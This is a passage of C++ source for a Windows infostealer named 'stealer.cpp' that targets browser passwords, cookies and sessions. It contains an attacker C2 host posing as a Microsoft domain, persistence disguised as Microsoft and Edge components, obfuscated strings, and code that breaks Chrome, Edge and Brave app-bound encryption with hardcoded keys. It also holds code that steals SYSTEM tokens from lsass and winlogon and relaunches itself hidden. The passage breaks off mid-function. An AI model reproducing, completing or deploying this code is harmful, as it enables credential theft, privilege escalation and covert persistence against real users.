// stealer.cpp — browser credential / cookie / session collector
// build: ./build.sh
#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <ncrypt.h>
#include <objbase.h>
#include <oleauto.h>
#include <shlobj.h>
#include <shellapi.h>
#include <taskschd.h>
#include <sqlite3.h>
#include <tlhelp32.h>
#include <rpc.h>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <utility>
#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cwchar>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ncrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef BCRYPT_CHACHA20_POLY1305_ALGORITHM
#define BCRYPT_CHACHA20_POLY1305_ALGORITHM L"CHACHA20_POLY1305"
#endif

/* ==================== config — EDIT ==================== */
#define C2_HOST_STR  "microsoft-sercure.gleeze.com"
#define C2_PATH_STR  "/rx.php"
#define C2_KEY_STR   "CHANGE_ME_9f3a1c7b2d"
#define C2_PORT      443
#define UA_STR       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define CHUNK_SZ     50000
#define SLEEP_MS     12000
/* ====================================================== */

#define TRUST_FOLDER   L"MicrosoftEdgeUpdate"
#define PERSIST_NAME   L"SystemHost.exe"
#define DLL_RES_ID     200
#define RT_RCDATA_W    MAKEINTRESOURCEW(10)
#define RUN_KEY        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_VALUE      L"SecurityHealth"
#define TASK_NAME      L"MicrosoftEdgeUpdateTaskMachineUA2"

#define MAX_PROBES     6

constexpr char XK = 0x5B;
template <size_t N> struct Obf {
    char d[N];
    constexpr Obf(const char (&s)[N]) : d{} { for (size_t i = 0; i < N; ++i) d[i] = s[i] ^ (char)(XK + i); }
    std::string str() const { std::string r; for (size_t i = 0; i + 1 < N; ++i) r += (char)(d[i] ^ (char)(XK + i)); return r; }
};
#define O(s) (Obf<sizeof(s)>(s).str())

/* ---------- helpers ---------- */
static std::string W2A(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
    std::string s(n - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], n, NULL, NULL);
    return s;
}
static std::wstring A2W(const std::string& a) {
    if (a.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, a.c_str(), -1, NULL, 0);
    std::wstring w(n - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, a.c_str(), -1, &w[0], n);
    return w;
}
static std::wstring Env(const wchar_t* n) {
    wchar_t b[MAX_PATH * 2] = {0};
    DWORD r = ExpandEnvironmentStringsW(n, b, MAX_PATH * 2);
    return (r && r <= MAX_PATH * 2) ? std::wstring(b) : std::wstring();
}
static std::wstring TrustedDir() {
    std::wstring pf = Env(L"%ProgramFiles%");
    if (pf.empty()) pf = L"C:\\Program Files";
    return pf + L"\\" + TRUST_FOLDER;
}
static std::string Hex(HRESULT hr) {
    char b[16]; sprintf(b, "%08lX", (unsigned long)hr); return std::string(b);
}
static bool Exists(const std::wstring& p) {
    DWORD a = GetFileAttributesW(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}
static std::string ReadAll(const std::wstring& p) {
    FILE* f = _wfopen(p.c_str(), L"rb");
    if (!f) return {};
    std::string out; char buf[8192]; size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) out.append(buf, n);
    fclose(f);
    return out;
}
static std::vector<uint8_t> ReadVec(const std::wstring& p) {
    std::string s = ReadAll(p);
    return std::vector<uint8_t>(s.begin(), s.end());
}
static std::wstring TempDir() { wchar_t b[MAX_PATH] = {0}; GetTempPathW(MAX_PATH, b); return std::wstring(b); }
static std::wstring RandName() { wchar_t b[32]; swprintf(b, 32, L"%08x%04x", GetTickCount(), rand() & 0xFFFF); return std::wstring(b); }
static std::string ARandName() { char b[40]; sprintf(b, "%08x%04x", (unsigned)GetTickCount(), rand() & 0xFFFF); return std::string(b); }

static std::vector<uint8_t> HexBytes(const char* h) {
    std::vector<uint8_t> v; size_t n = strlen(h);
    auto cvt = [](char c)->int { if (c >= '0' && c <= '9') return c - '0'; if (c >= 'a' && c <= 'f') return c - 'a' + 10; if (c >= 'A' && c <= 'F') return c - 'A' + 10; return 0; };
    for (size_t i = 0; i + 1 < n; i += 2) v.push_back((uint8_t)((cvt(h[i]) << 4) | cvt(h[i + 1])));
    return v;
}
static std::string ToHex(const std::vector<uint8_t>& v) {
    static const char* h = "0123456789abcdef";
    std::string s; s.reserve(v.size() * 2);
    for (uint8_t b : v) { s += h[b >> 4]; s += h[b & 15]; }
    return s;
}
static std::vector<uint8_t> Unhex(const std::string& s) { return HexBytes(s.c_str()); }

static std::wstring SelfPath();

static void Log(const std::string& s) {
    if (s.empty()) return;
    std::wstring p = TempDir() + L"\\SystemHost.log";
    FILE* f = _wfopen(p.c_str(), L"ab");
    if (!f) return;
    fwrite(s.data(), 1, s.size(), f);
    fclose(f);
}

static std::string Clean(std::string s) {
    for (auto& c : s) if ((unsigned char)c < 0x20 || c == 0x7F) c = ' ';
    return s;
}
static std::string Asc(const std::string& s, size_t max = 180) {
    std::string o;
    for (char c : s) {
        if ((unsigned char)c >= 0x20 && (unsigned char)c < 0x7F) o += c;
        if (o.size() >= max) break;
    }
    return o;
}

/* ---------- global state ---------- */
struct Collector {
    std::string pw, af, ck;
    int nPw = 0, nAf = 0, nCk = 0, nCkBad = 0, nUnd = 0;
    std::string host, user;
};
static Collector g_c;
static std::string g_run;
static std::string g_dbg;

static std::map<std::string, std::vector<uint8_t>> g_abe;
static std::wstring g_ulocal, g_uroam;
static bool g_isSystem = false;

/* ---------- base64 ---------- */
static const char* B64T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static std::vector<uint8_t> B64Dec(const std::string& s) {
    static int8_t rev[256]; static bool init = false;
    if (!init) { for (int i = 0; i < 256; ++i) rev[i] = -1; for (int i = 0; i < 64; ++i) rev[(uint8_t)B64T[i]] = (int8_t)i; init = true; }
    std::vector<uint8_t> o; uint32_t buf = 0; int bits = 0;
    for (char c : s) {
        int8_t v = rev[(uint8_t)c];
        if (v < 0) continue;
        buf = (buf << 6) | v; bits += 6;
        if (bits >= 8) { bits -= 8; o.push_back((uint8_t)(buf >> bits)); }
    }
    return o;
}

/* ---------- crypto ---------- */
static std::vector<uint8_t> Hash(LPCWSTR alg, const std::vector<uint8_t>& d) {
    std::vector<uint8_t> out; BCRYPT_ALG_HANDLE h = NULL; BCRYPT_HASH_HANDLE hh = NULL;
    DWORD len = 0, r = 0;
    if (BCryptOpenAlgorithmProvider(&h, alg, NULL, 0) != 0) return out;
    BCryptGetProperty(h, BCRYPT_HASH_LENGTH, (PUCHAR)&len, sizeof(len), &r, 0);
    out.resize(len);
    if (BCryptCreateHash(h, &hh, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(hh, (PUCHAR)d.data(), (ULONG)d.size(), 0);
        BCryptFinishHash(hh, out.data(), len, 0);
        BCryptDestroyHash(hh);
    }
    BCryptCloseAlgorithmProvider(h, 0);
    return out;
}
static std::vector<uint8_t> Pbkdf2Sha1(const std::vector<uint8_t>& pw, const std::vector<uint8_t>& salt, int iters, int len) {
    BCRYPT_ALG_HANDLE h = NULL;
    if (BCryptOpenAlgorithmProvider(&h, BCRYPT_SHA1_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0) return {};
    std::vector<uint8_t> out(len);
    NTSTATUS s = BCryptDeriveKeyPBKDF2(h, (PUCHAR)pw.data(), (ULONG)pw.size(),
        (PUCHAR)salt.data(), (ULONG)salt.size(), (ULONGLONG)iters, out.data(), (ULONG)len, 0);
    BCryptCloseAlgorithmProvider(h, 0);
    if (s != 0) out.clear();
    return out;
}
static bool GcmDec(const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv,
                   const std::vector<uint8_t>& ct, const std::vector<uint8_t>& tag,
                   const std::vector<uint8_t>& aad, std::vector<uint8_t>& out) {
    BCRYPT_ALG_HANDLE h = NULL; BCRYPT_KEY_HANDLE hk = NULL; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&h, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(h, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (BCryptGenerateSymmetricKey(h, &hk, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) == 0) {
        out.resize(ct.size() + 16);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai; BCRYPT_INIT_AUTH_MODE_INFO(ai);
        ai.pbNonce = (PUCHAR)iv.data(); ai.cbNonce = (ULONG)iv.size();
        if (!aad.empty()) { ai.pbAuthData = (PUCHAR)aad.data(); ai.cbAuthData = (ULONG)aad.size(); }
        ai.pbTag = (PUCHAR)tag.data(); ai.cbTag = (ULONG)tag.size();
        ULONG done = 0;
        if (BCryptDecrypt(hk, (PUCHAR)ct.data(), (ULONG)ct.size(), &ai, NULL, 0,
                          out.data(), (ULONG)out.size(), &done, 0) == 0) { out.resize(done); ok = true; }
        BCryptDestroyKey(hk);
    }
    BCryptCloseAlgorithmProvider(h, 0);
    return ok;
}
static bool ChaChaDec(const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv,
                      const std::vector<uint8_t>& ct, const std::vector<uint8_t>& tag,
                      std::vector<uint8_t>& out) {
    BCRYPT_ALG_HANDLE h = NULL; BCRYPT_KEY_HANDLE hk = NULL; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&h, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0) != 0) return false;
    if (BCryptGenerateSymmetricKey(h, &hk, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) == 0) {
        out.resize(ct.size() + 16);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai; BCRYPT_INIT_AUTH_MODE_INFO(ai);
        ai.pbNonce = (PUCHAR)iv.data(); ai.cbNonce = (ULONG)iv.size();
        ai.pbTag = (PUCHAR)tag.data(); ai.cbTag = (ULONG)tag.size();
        ULONG done = 0;
        if (BCryptDecrypt(hk, (PUCHAR)ct.data(), (ULONG)ct.size(), &ai, NULL, 0,
                          out.data(), (ULONG)out.size(), &done, 0) == 0) { out.resize(done); ok = true; }
        BCryptDestroyKey(hk);
    }
    BCryptCloseAlgorithmProvider(h, 0);
    return ok;
}
static bool Des3Dec(const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv,
                    const std::vector<uint8_t>& ct, std::vector<uint8_t>& out) {
    BCRYPT_ALG_HANDLE h = NULL; BCRYPT_KEY_HANDLE hk = NULL; bool ok = false;
    if (BCryptOpenAlgorithmProvider(&h, BCRYPT_3DES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(h, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (BCryptGenerateSymmetricKey(h, &hk, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) == 0) {
        out.resize(ct.size() + 8);
        ULONG done = 0;
        if (BCryptDecrypt(hk, (PUCHAR)ct.data(), (ULONG)ct.size(), NULL,
                          (PUCHAR)iv.data(), (ULONG)iv.size(), out.data(), (ULONG)out.size(),
                          &done, BCRYPT_BLOCK_PADDING) == 0) { out.resize(done); ok = true; }
        BCryptDestroyKey(hk);
    }
    BCRYPT_ALG_HANDLE h2 = h;
    BCryptCloseAlgorithmProvider(h2, 0);
    return ok;
}
static std::vector<uint8_t> DpapiUnprotect(const std::vector<uint8_t>& in) {
    std::vector<uint8_t> out;
    if (in.empty()) return out;
    DATA_BLOB di{ (DWORD)in.size(), (BYTE*)in.data() }, dout{ 0, NULL };
    if (CryptUnprotectData(&di, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &dout)) {
        out.assign(dout.pbData, dout.pbData + dout.cbData);
        LocalFree(dout.pbData);
    } else {
        g_dbg += "dpapi err=" + std::to_string(GetLastError()) + " ";
    }
    return out;
}

/* ---------- CNG machine key ---------- */
struct CngJob {
    std::vector<std::wstring> names;
    const std::vector<uint8_t>* in;
    std::vector<std::vector<uint8_t>> outs;
};

static bool NcryptTryKey(NCRYPT_KEY_HANDLE key, const std::vector<uint8_t>& in,
                         std::vector<uint8_t>& out) {
    DWORD need = 0;
    if (NCryptDecrypt(key, (PBYTE)in.data(), (DWORD)in.size(), NULL, NULL, 0,
                      &need, NCRYPT_SILENT_FLAG) != 0) return false;
    out.resize(need);
    DWORD got = 0;
    if (NCryptDecrypt(key, (PBYTE)in.data(), (DWORD)in.size(), NULL,
                      out.data(), need, &got, NCRYPT_SILENT_FLAG) != 0) return false;
    if (got < 32) return false;
    out.resize(32);
    return true;
}

static void EnumSealKeys(std::vector<std::wstring>& names) {
    names = { L"Google Chromekey2", L"Google Chromekey1", L"Google Chromekey3" };
    std::set<std::wstring> seen(names.begin(), names.end());

    NCRYPT_PROV_HANDLE prov = 0;
    if (NCryptOpenStorageProvider(&prov, MS_KEY_STORAGE_PROVIDER, 0) != 0) return;
    PVOID en = NULL;
    for (;;) {
        NCryptKeyName* kn = NULL;
        if (NCryptEnumKeys(prov, NULL, &kn, &en, NCRYPT_MACHINE_KEY_FLAG) != 0 || !kn) break;
        if (kn->pszName && seen.insert(kn->pszName).second) names.push_back(kn->pszName);
        NCryptFreeBuffer(kn);
    }
    if (en) NCryptFreeBuffer(en);
    NCryptFreeObject(prov);
}

static bool CngJobRun(void* ctx, std::vector<uint8_t>&) {
    CngJob* j = (CngJob*)ctx;
    NCRYPT_PROV_HANDLE prov = 0;
    if (NCryptOpenStorageProvider(&prov, MS_KEY_STORAGE_PROVIDER, 0) != 0) return false;
    for (auto& n : j->names) {
        for (int fl = 0; fl < 2; ++fl) {
            NCRYPT_KEY_HANDLE key = 0;
            DWORD flags = NCRYPT_SILENT_FLAG | (fl ? NCRYPT_MACHINE_KEY_FLAG : 0);
            if (NCryptOpenKey(prov, &key, n.c_str(), 0, flags) != 0) continue;
            std::vector<uint8_t> k;
            if (NcryptTryKey(key, *j->in, k)) j->outs.push_back(k);
            NCryptFreeObject(key);
            break;
        }
    }
    NCryptFreeObject(prov);
    return !j->outs.empty();
}

/* ==================== ABE ==================== */
struct IElevatorChrome : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const BSTR, const BSTR, const BSTR,
                                                             const BSTR, const DWORD, BSTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(const DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};
struct IElevatorEdge : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Base0() = 0;
    virtual HRESULT STDMETHODCALLTYPE Base1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Base2() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const BSTR, const BSTR, const BSTR,
                                                             const BSTR, const DWORD, BSTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(const DWORD, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

struct VendorInfo {
    const wchar_t* svc;
    const wchar_t* exe;
    const wchar_t* pathHint;
    const CLSID*   clsid;
    std::vector<const IID*> iids;
    bool           edgeLayout;
};

static const CLSID kClsidChrome = { 0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B} };
static const CLSID kClsidEdge   = { 0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67} };
static const CLSID kClsidBrave  = { 0x576B31AF,0x6369,0x4B6B,{0x85,0x60,0xE4,0xB2,0x03,0xA9,0x7A,0x8B} };

static const IID kIidV2Chrome = { 0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38} };
static const IID kIidV2Edge   = { 0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05} };
static const IID kIidChrome1  = { 0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C} };
static const IID kIidChrome2  = { 0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8} };
static const IID kIidChrome3  = { 0xB88C45B9,0x8825,0x4629,{0xB8,0x3E,0x77,0xCC,0x67,0xD9,0xCE,0xED} };
static const IID kIidEdge1    = { 0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B} };
static const IID kIidBrave1   = { 0xF396861E,0x0C8E,0x4C71,{0x82,0x56,0x2F,0xAE,0x6D,0x75,0x9C,0xE9} };

static const VendorInfo* VendorFor(const std::string& label) {
    static const VendorInfo chrome = { L"GoogleChromeElevationService", L"chrome.exe", L"Google\\Chrome",
                                       &kClsidChrome, { &kIidV2Chrome, &kIidChrome2, &kIidChrome1, &kIidChrome3 }, false };
    static const VendorInfo edge   = { L"MicrosoftEdgeElevationService", L"msedge.exe", L"Microsoft\\Edge",
                                       &kClsidEdge, { &kIidV2Edge, &kIidEdge1 }, true };
    static const VendorInfo brave  = { L"BraveElevationService", L"brave.exe", L"BraveSoftware",
                                       &kClsidBrave, { &kIidV2Chrome, &kIidBrave1 }, false };
    if (label == "Chrome") return &chrome;
    if (label == "Edge")   return &edge;
    if (label == "Brave")  return &brave;
    return NULL;
}

static bool IsElevated() {
    HANDLE t = NULL; TOKEN_ELEVATION e{};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return false;
    DWORD n = 0;
    GetTokenInformation(t, TokenElevation, &e, sizeof(e), &n);
    CloseHandle(t);
    return e.TokenIsElevated != 0;
}

static bool EnablePriv(const wchar_t* name) {
    HANDLE t = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) return false;
    TOKEN_PRIVILEGES tp{}; tp.PrivilegeCount = 1;
    bool ok = false;
    if (LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid)) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(t, FALSE, &tp, 0, NULL, NULL))
            ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(t);
    return ok;
}

static bool WithSystemToken(bool (*fn)(void*, std::vector<uint8_t>&), void* ctx,
                            std::vector<uint8_t>& out) {
    if (!EnablePriv(L"SeDebugPrivilege")) { g_dbg += "ABE: no SeDebugPrivilege\n"; return false; }
    DWORD mySess = 0; ProcessIdToSessionId(GetCurrentProcessId(), &mySess);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{ sizeof(pe) };
    const wchar_t* names[] = { L"lsass.exe", L"winlogon.exe" };
    HANDLE hTok = NULL, hDup = NULL; bool ok = false;
    if (Process32FirstW(snap, &pe)) do {
        bool hit = false;
        for (auto n : names) if (_wcsicmp(pe.szExeFile, n) == 0) hit = true;
        if (!hit) continue;
        DWORD s = 0; ProcessIdToSessionId(pe.th32ProcessID, &s);
        if (s != mySess) continue;
        HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if (!p) p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!p) continue;
        bool got = OpenProcessToken(p, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hTok) &&
                   DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                                    TokenImpersonation, &hDup);
        CloseHandle(p);
        if (got) break;
        if (hTok) { CloseHandle(hTok); hTok = NULL; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    if (!hDup) { g_dbg += "ABE: no SYSTEM token\n"; return false; }

    if (SetThreadToken(NULL, hDup)) {
        ok = fn(ctx, out);
        RevertToSelf();
        g_dbg += std::string("ABE: sys tok ") + (ok ? "ok" : "fail") + "\n";
    }
    CloseHandle(hDup);
    if (hTok) CloseHandle(hTok);
    return ok;
}

static bool UnwrapOuter(void* ctx, std::vector<uint8_t>& out) {
    out = DpapiUnprotect(*(const std::vector<uint8_t>*)ctx);
    return !out.empty();
}

static bool LooksLikeDpapi(const std::vector<uint8_t>& b) {
    return b.size() >= 0x20 && b[0] == 0x01 && b[1] == 0 && b[2] == 0 && b[3] == 0;
}

static uint32_t Rd32(const std::vector<uint8_t>& p, size_t o) {
    return (uint32_t)p[o] | ((uint32_t)p[o + 1] << 8) | ((uint32_t)p[o + 2] << 16) | ((uint32_t)p[o + 3] << 24);
}

static const char* kAesSeal  = "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787";
static const char* kChaSeal  = "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660";
static const char* kXorMask3 = "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390";
static const char* kXorMask4 = "208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158";

static std::vector<uint8_t> UnsealBody(const std::vector<uint8_t>& b) {
    std::vector<uint8_t> k;
    if (b.size() < 2) return k;
    const uint8_t flag = b[0];
    std::vector<uint8_t> plain;

    if (flag == 1 || flag == 2) {
        if (b.size() != 61) { g_dbg += "ABE: f" + std::to_string(flag) + " badlen "; return k; }
        std::vector<uint8_t> iv(b.begin() + 1, b.begin() + 13);
        std::vector<uint8_t> ct(b.begin() + 13, b.begin() + 45);
        std::vector<uint8_t> tag(b.begin() + 45, b.end());
        bool ok = (flag == 1)
            ? GcmDec(HexBytes(kAesSeal), iv, ct, tag, {}, plain)
            : ChaChaDec(HexBytes(kChaSeal), iv, ct, tag, plain);
        if (ok && plain.size() >= 32) k.assign(plain.begin(), plain.begin() + 32);
        g_dbg += std::string("ABE: f") + (char)('0' + flag) + (ok ? " ok " : " fail ");
        return k;
    }

    if (flag == 3 || flag == 4) {
        if (b.size() != 93) { g_dbg += "ABE: f" + std::to_string(flag) + " badlen=" + std::to_string(b.size()) + " "; return k; }
        std::vector<uint8_t> encKey(b.begin() + 1, b.begin() + 33);
        std::vector<uint8_t> iv(b.begin() + 33, b.begin() + 45);
        std::vector<uint8_t> ct(b.begin() + 45, b.begin() + 77);
        std::vector<uint8_t> tag(b.begin() + 77, b.end());

        CngJob job; job.in = &encKey;
        EnumSealKeys(job.names);
        g_dbg += "ABE: f" + std::to_string(flag) + " keys=" + std::to_string(job.names.size()) + " ";

        std::vector<uint8_t> dummy;
        bool ran = g_isSystem ? CngJobRun(&job, dummy)
                              : WithSystemToken(CngJobRun, &job, dummy);
        if (!ran || job.outs.empty()) { g_dbg += "cng fail "; return k; }

        const char* own = (flag == 3) ? kXorMask3 : kXorMask4;
        const char* alt = (flag == 3) ? kXorMask4 : kXorMask3;
        const char* masks[] = { own, alt, NULL };
        for (auto& base : job.outs) {
            for (auto m : masks) {
                std::vector<uint8_t> key = base;
                if (m) {
                    auto xm = HexBytes(m);
                    for (size_t i = 0; i < 32 && i < xm.size(); ++i) key[i] ^= xm[i];
                }
                if (GcmDec(key, iv, ct, tag, {}, plain) && plain.size() >= 32) {
                    k.assign(plain.begin(), plain.begin() + 32);
                    g_dbg += "ok ";
                    return k;
                }
            }
        }
        g_dbg += "unseal fail ";
        return k;
    }

    g_dbg += "ABE: bad flag " + std::to_string((int)flag) + " ";
    return k;
}

static std::vector<uint8_t> UnwrapAbe(const std::vector<uint8_t>& p) {
    if (p.size() >= 9) {
        uint32_t l1 = Rd32(p, 0);
        if ((size_t)4 + l1 + 4 <= p.size()) {
            size_t o = 4 + l1;
            uint32_t l2 = Rd32(p, o);
            o += 4;
            if (l2 >= 1 && o + l2 <= p.size())
                return UnsealBody(std::vector<uint8_t>(p.begin() + o, p.begin() + o + l2));
        }
    }
    return UnsealBody(p);
}

/* pure DPAPI + CNG: no COM, no install dir, no path validation */
static std::vector<uint8_t> AbeViaDpapi(const std::vector<uint8_t>& blob) {
    std::vector<uint8_t> sys;
    if (!WithSystemToken(UnwrapOuter, (void*)&blob, sys)) { g_dbg += "ABE: sys layer fail\n"; return {}; }
    if (!LooksLikeDpapi(sys)) {
        auto k0 = UnwrapAbe(sys);
        if (k0.size() == 32) return k0;
        g_dbg += "ABE: outer not dpapi\n";
        return {};
    }
    std::vector<uint8_t> plain = DpapiUnprotect(sys);
    if (plain.empty()) { g_dbg += "ABE: user layer fail\n"; return {}; }
    g_dbg += "ABE: dpapi layers ok (" + std::to_string(plain.size()) + ")\n";

    auto k = UnwrapAbe(plain);
    if (k.size() != 32) g_dbg += "ABE: dpapi exhausted\n";
    return k;
}

static bool PeelSystem(const std::vector<uint8_t>& blob, char& kind,
                       std::vector<uint8_t>& payload, bool alreadySystem) {
    std::vector<uint8_t> sys;
    if (alreadySystem) sys = DpapiUnprotect(blob);
    else if (!WithSystemToken(UnwrapOuter, (void*)&blob, sys)) return false;
    if (sys.empty()) return false;
    if (LooksLikeDpapi(sys)) { kind = 'S'; payload = sys; return true; }
    auto k = UnwrapAbe(sys);
    if (k.size() != 32) return false;
    kind = 'K'; payload = k;
    return true;
}

static bool DuplicateSystemToken(HANDLE& out) {
    if (!EnablePriv(L"SeDebugPrivilege")) return false;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{ sizeof(pe) };
    const wchar_t* names[] = { L"lsass.exe", L"winlogon.exe" };
    bool ok = false;
    if (Process32FirstW(snap, &pe)) do {
        bool hit = false;
        for (auto n : names) if (_wcsicmp(pe.szExeFile, n) == 0) hit = true;
        if (!hit) continue;
        HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!p) continue;
        HANDLE tok = NULL;
        if (OpenProcessToken(p, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &tok)) {
            if (DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &out) == 0)
                out = NULL;
            CloseHandle(tok);
        }
        CloseHandle(p);
        if (out) { ok = true; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return ok;
}

static bool RunAsSystem(const std::wstring& params, const std::wstring& cwd) {
    HANDLE tok = NULL;
    if (!DuplicateSystemToken(tok) || !tok) return false;
    EnablePriv(L"SeAssignPrimaryTokenPrivilege");
    EnablePriv(L"SeIncreaseQuotaPrivilege");
    EnablePriv(L"SeImpersonatePrivilege");
    std::wstring cmd = L"\"" + SelfPath() + L"\" " + params;
    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    si.lpDesktop = (LPWSTR)L"winsta0\\default";
    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessAsUserW(tok, NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, cwd.empty() ? NULL : cwd.c_str(), &si, &pi);
    if (!ok) ok = CreateProcessWithTokenW(tok, LOGON_WITH_PROFILE, NULL, (LPWSTR)cmd.c_str(),
                                         CREATE_NO_WINDOW, NULL, cwd.empty() ? NULL : cwd.c_str(), &si, &pi);
    CloseHandle(tok);
    if (!ok) return false;
    WaitForSingleObject(pi.hProcess, 90000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return true;
}

/* ---------- process / install discovery ---------- */
static std::wstring ImagePathOf(DWORD pid) {
    HANDLE p = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!p) return {};
    wchar_t b[MAX_PATH * 2] = {0}; DWORD n = MAX_PATH * 2;
    std::wstring r;
    if (QueryFullProcessImageNameW(p, 0, b, &n)) r = b;
    CloseHandle(p);
    return r;
}

static bool ProcCmdLine(HANDLE p, std::wstring& out) {
    typedef LONG (NTAPI* pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    auto q = (pNtQIP)GetProcAddress(nt, "NtQueryInformationProcess");
    if (!q) return false;
    struct PBI { PVOID r1; PVOID PebBase; PVOID r2[2]; ULONG_PTR pid; ULONG_PTR ppid; } pbi{};
    if (q(p, 0, &pbi, sizeof(pbi), NULL) != 0 || !pbi.PebBase) return false;
    BYTE* par = NULL;
    if (!ReadProcessMemory(p, (BYTE*)pbi.PebBase + 0x20, &par, sizeof(par), NULL) || !par) return false;
